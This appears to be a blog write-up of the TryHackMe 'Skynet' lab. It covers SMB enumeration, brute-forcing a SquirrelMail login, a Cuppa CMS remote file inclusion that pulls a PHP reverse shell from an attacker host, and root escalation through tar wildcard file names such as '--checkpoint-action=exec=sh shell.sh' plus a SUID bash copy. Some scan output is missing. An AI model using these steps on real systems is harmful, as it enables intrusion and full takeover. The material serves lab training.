# **Description**

Hello l33ts, I hope you are doing well. We are doing [Skynet](https://tryhackme.com/room/skynet) from [TryHackMe](https://tryhackme.com)

# **Enumeration**
## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.96.15

```

There are 5 open ports, let's start enumerating the webserver.

## WebServer

Let's navigate to the webpage `http://{target_IP}/`

![](/assets/img/tryhackme/skynet/Untitled.png)

We see what looks like search engine, nothing in the source code, let's do a directory enumeration.

## Gobuster

/squirrelmail         (Status: 301) [Size: 317] [--> http://10.10.96.15/squirrelmail/]

===============================================================
```

We found the interesting directory **/squirrelmail**, let's navigate to it.

![](/assets/img/tryhackme/skynet/Untitled1.png)

It is a login page of SquirrelMail, since we don't have any credentials for that, let's continue our enumeration elsewhere.

## SMB

We can enumerate SMB using `enum4linux`, the commands is `enum4linux {target_IP}`

![](/assets/img/tryhackme/skynet/Untitled2.png)

From this scan, we found the username `milesdyson` and 2 interesting share; **anonymous** and **milesdyson**. To login to the SMB shares, we can use `smbclient`, the command would look like this:`sudo smbclient -N \\\\{target_IP}\\{share-name}`. -N options tells smbclient to login without a password.

![](/assets/img/tryhackme/skynet/Untitled3.png)

We can't access *milesdyson* share, but we can access *anonymous* share.

Inside the *anonymous* share, we found a **attention.txt** file and a **log1.txt**, we can download the two files using the command `get {filename}`. Let's see what's inside the two files.

![](/assets/img/tryhackme/skynet/Untitled4.png)

The **attention.txt** file has a note from *milesdyson* that says that the employees need to change their password due to a system malfunction, the **log1.txt** file contains what looks like a list of passwords.

We have a username and a list of passwords, let's brute force the login page of SquirrelMail and see if we can find the password. I used burp intruder to do the job, and i was able to find the password.

![](/assets/img/tryhackme/skynet/Untitled5.png)

To spot the working password, we can look at the length and the status code of the response, the real password has a different value compared to other passwords.

Let's try now login to the mail service.

![](/assets/img/tryhackme/skynet/Untitled6.png)

We managed to login successfully, and we can see milesdyson's emails, one of the emails has *samba password reset* as a subject, let's take a look at it.

![](/assets/img/tryhackme/skynet/Untitled7.png)

We find the password of smb, let's login to the milesdyson share with the user milesdyson.`sudo smbclient -U milesdyson \\\\{target_IP}\\milesdyson`

![](/assets/img/tryhackme/skynet/Untitled8.png)

We managed to login to milesdyson share, inside the share some pdf files and **notes** directory, let's see what's inside it.

![](/assets/img/tryhackme/skynet/Untitled9.png)

There are a lot pdf files, but there is an interesting file names **important.txt**, let's download it to our machine with `get important.txt` and take a look at it.

![](/assets/img/tryhackme/skynet/Untitled10.png)

The file revealed a web directory, let's navigate to it.

![](/assets/img/tryhackme/skynet/Untitled11.png)

It says it's Miles Dyson personal page, let's run a directory scan on it.

```Terminal

===============================================================
```

We found **/administrator** directory, let's go to it.

![](/assets/img/tryhackme/skynet/Untitled12.png)

It's a login page of Cuppa CMS, i tried some knows credentials but it didn't work. Let's search if this cms has any vulnerabilities.

![](/assets/img/tryhackme/skynet/Untitled13.png)

Indeed, we found a Local/Remote File inclusion vulnerability. With this vulnerability, we can read file on the server and upload files and run them on the server. Let's see how to exploit this.


# **Foothold**

Let's navigate to the exploit we have found.

![](/assets/img/tryhackme/skynet/Untitled14.png)

The path of the vulnerability is `cuppa/alerts/alertConfigField.php?urlConfig=[FI]`, with the **urlConfig** we can either enter a path for a local file to read or a url that contains a file.

I setup a http server that has a php reverse shell code in it, i then setup a netcat listener on my machine and used the rfi path to server the php code.`http://{target_IP}/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://{attacker_ip}/reverse_shell.php`

![](/assets/img/tryhackme/skynet/Untitled15.png)

Great! We got a shell, i used python pty trick to stabilize my shell. Let's do some enumeration on the machine now.


# **Privilege Escalation**

Let's do some basic enumeration first.

![](/assets/img/tryhackme/skynet/Untitled16.png)

On milesdyson home directory a backups directory that has two files, *backup.sh* and *backup.tgz*. We can notice that **backup.tgz** has been modified very recently, the **backup.sh** file is readable so let's see what it does.

![](/assets/img/tryhackme/skynet/Untitled17.png)

The script takes a backup of **/var/www/html**, the webpage files, and put the backup where we saw it, and there is a cronjob that runs the script as root.

The thing we notice about **backup.sh** script is that it uses **wildcard**. I searched on google on how to exploit this and found this useful [article](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/) that explains how to exploit the wildcard.

In my case, i changed the directory to **/var/www/html**, created a file named *shell.sh* with this command in it `cp /bin/bash /tmp/bash && chmod +s /tmp/bash`, this command puts a copy of /bin/bash in /tmp/bash and give it suid permission so that we can run it as root, after that i created the following two file with `echo "" > "--checkpoint-action=exec=sh shell.sh"` and `echo "" > --checkpoint=1`, and when the backup.sh script runs, it will execute our shell.sh script, and if we check the /tmp directory, we will be able to find the bash binary with suid permission.

![](/assets/img/tryhackme/skynet/root.png)

We can run `/tmp/bash -p` and get root.

Thank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) .
